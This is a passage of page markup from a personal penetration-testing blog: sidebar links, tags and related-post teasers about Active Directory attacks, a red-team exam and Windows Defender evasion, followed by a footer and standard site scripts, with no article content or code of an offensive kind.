Persistence</a><li><a href="/posts/Active-Directory-Lateral-Movement/">Active Directory - Lateral Movement</a><li><a href="/posts/Active-Directory-Introduction/">Active Directory - Introduction</a><li><a href="/posts/CRTE-Exam-Review/">CRTE Exam Review</a><li><a href="/posts/Bypassing-Windows-Defender/">Bypassing Windows Defender</a></ul></div><div id="access-tags"><div class="panel-heading">Trending Tags</div><div class="d-flex flex-wrap mt-3 mb-1 mr-3"> <a class="post-tag" href="/tags/active-directory/">active-directory</a> <a class="post-tag" href="/tags/amsi-bypass/">amsi-bypass</a> <a class="post-tag" href="/tags/password-reuse/">password-reuse</a> <a class="post-tag" href="/tags/acl-enumeration/">ACL-enumeration</a> <a class="post-tag" href="/tags/active-directory-domain-persistence/">active-directory-domain-persistence</a> <a class="post-tag" href="/tags/active-directory-enumeration/">active-directory-enumeration</a> <a class="post-tag" href="/tags/active-directory-introduction/">active-directory-introduction</a> <a class="post-tag" href="/tags/active-directory-lateral-movement/">active-directory-lateral-movement</a> <a class="post-tag" href="/tags/active-directory-local-privilege-escalation/">active-directory-local-privilege-escalation</a> <a class="post-tag" href="/tags/as-rep/">AS-REP</a></div></div></div><script src="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.js"></script><div id="toc-wrapper" class="pl-0 pr-4 mb-5"><div class="panel-heading pl-3 pt-2 mb-2">Contents</div><nav id="toc" data-toggle="toc"></nav></div></div></div><div class="row"><div class="col-12 col-lg-11 col-xl-8"><div id="tail-wrapper" class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"><div id="related-posts" class="mt-5 mb-2 mb-sm-4"><h3 class="pt-2 mt-1 mb-4 ml-1" data-toc-skip>Further Reading</h3><div class="card-deck mb-4"><div class="card"> <a href="/posts/HTB-Node-Writeup/"><div class="card-body"> <em class="timeago small" data-ts="1647833580" > 2022-03-21 </em><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Hack The Box - Node</h3><div class="text-muted small"><p> Node is about enumerating an Express NodeJS application to find an API endpoint that discloses the usernames and password hashes. To root the box is a simple buffer overflow and possible by three...</p></div></div></a></div><div class="card"> <a href="/posts/CRTE-Exam-Review/"><div class="card-body"> <em class="timeago small" data-ts="1689385980" > 2023-07-15 </em><h3 class="pt-0 mt-1 mb-3" data-toc-skip>CRTE Exam Review</h3><div class="text-muted small"><p> Introduction I am thrilled to announce that I have successfully passed the CRTE (Certified Red Team Expert) exam from Altered Security, and I am excited to share my journey and experience with a...</p></div></div></a></div><div class="card"> <a href="/posts/Bypassing-Windows-Defender/"><div class="card-body"> <em class="timeago small" data-ts="1684074600" > 2023-05-14 </em><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Bypassing Windows Defender</h3><div class="text-muted small"><p> Introduction Greetings, everyone 👋. In this brief article, I will outline a manual obfuscation technique for bypassing Windows Defender. Specifically, I will cover how to patch the Antimalware S...</p></div></div></a></div></div></div><div class="post-navigation d-flex justify-content-between"> <a href="/posts/Active-Directory-Windows-Local-Priv-Esc/" class="btn btn-outline-primary" prompt="Older"><p>Active Directory - Local Privilege Escalation</p></a> <a href="/posts/Active-Directory-Lateral-Movement/" class="btn btn-outline-primary" prompt="Newer"><p>Active Directory - Lateral Movement</p></a></div></div></div></div><footer class="d-flex w-100 justify-content-center"><div class="d-flex justify-content-between align-items-center text-muted"><div class="footer-left"><p class="mb-0"> © 2024 <a href="https://twitter.com/Bhaskarpal__">Bhaskar Pal</a>. <span data-toggle="tooltip" data-placement="top" title="Except where otherwise noted, the blog posts on this site are licensed under the Creative Commons Attribution 4.0 International (CC BY 4.0) License by the author.">Some rights reserved.</span></p></div><div class="footer-right"><p class="mb-0"> Powered by <a href="https://jekyllrb.com" target="_blank" rel="noopener">Jekyll</a> with <a href="https://github.com/cotes2020/jekyll-theme-chirpy" target="_blank" rel="noopener">Chirpy</a> theme.</p></div></div></footer></div><div id="search-result-wrapper" class="d-flex justify-content-center unloaded"><div class="col-12 col-sm-11 post-content"><div id="search-hints"><div id="access-tags"><div class="panel-heading">Trending Tags</div><div class="d-flex flex-wrap mt-3 mb-1 mr-3"> <a class="post-tag" href="/tags/active-directory/">active-directory</a> <a class="post-tag" href="/tags/amsi-bypass/">amsi-bypass</a> <a class="post-tag" href="/tags/password-reuse/">password-reuse</a> <a class="post-tag" href="/tags/acl-enumeration/">ACL-enumeration</a> <a class="post-tag" href="/tags/active-directory-domain-persistence/">active-directory-domain-persistence</a> <a class="post-tag" href="/tags/active-directory-enumeration/">active-directory-enumeration</a> <a class="post-tag" href="/tags/active-directory-introduction/">active-directory-introduction</a> <a class="post-tag" href="/tags/active-directory-lateral-movement/">active-directory-lateral-movement</a> <a class="post-tag" href="/tags/active-directory-local-privilege-escalation/">active-directory-local-privilege-escalation</a> <a class="post-tag" href="/tags/as-rep/">AS-REP</a></div></div></div><div id="search-results" class="d-flex flex-wrap justify-content-center text-muted mt-3"></div></div></div></div><div id="mask"></div><a id="back-to-top" href="#" aria-label="back-to-top" class="btn btn-lg btn-box-shadow" role="button"> <i class="fas fa-angle-up"></i> </a> <script src="https://cdn.jsdelivr.net/npm/simple-jekyll-search@1.10.0/dest/simple-jekyll-search.min.js"></script> <script> SimpleJekyllSearch({ searchInput: document.getElementById('search-input'), resultsContainer: document.getElementById('search-results'), json: '/assets/js/data/search.json', searchResultTemplate: '<div class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-lg-4 pr-lg-4 pl-xl-0 pr-xl-0"> <a href="{url}">{title}</a><div class="post-meta d-flex flex-column flex-sm-row text-muted mt-1 mb-1"> {categories} {tags}</div><p>{snippet}</p></div>', noResultsText: '<p class="mt-5">Oops! No result founds.</p>', templateMiddleware: function(prop, value, template) { if (prop === 'categories') { if (value === '') { return `${value}`; } else { return `<div class="mr-sm-4"><i class="far fa-folder fa-fw"></i>${value}</div>`; } } if (prop === 'tags') { if (value === '') { return `${value}`; } else { return `<div><i class="fa fa-tag fa-fw"></i>${value}</div>`; } } } }); </script> <script src="https://cdn.jsdelivr.net/combine/npm/magnific-popup@1/dist/jquery.magnific-popup.min.js,npm/lozad/dist/lozad.min.js,npm/clipboard@2/dist/clipboard.min.js"></script> <script src="https://cdn.jsdelivr.net/combine/npm/dayjs@1/dayjs.min.js,npm/dayjs@1/locale/en.min.js,npm/dayjs@1/plugin/relativeTime.min.js,npm/dayjs@1/plugin/localizedFormat.min.js"></script> <script defer src="/assets/js/dist/post.min.js"></script> <script src="https://cdn.jsdelivr.net/npm/bootstrap@4/dist/js/bootstrap.bundle.min.js"></script> <script defer src="/app.js"></script> <script defer src="https://www.googletagmanager.com/gtag/js?id=G-GZYBNZRQNP"></script> <script> document.addEventListener("DOMContentLoaded", function(event) { window.dataLayer = window.dataLayer || []; function gtag(){dataLayer.push(arguments);} gtag('js', new Date()); gtag('config', 'G-GZYBNZRQNP'); }); </script>
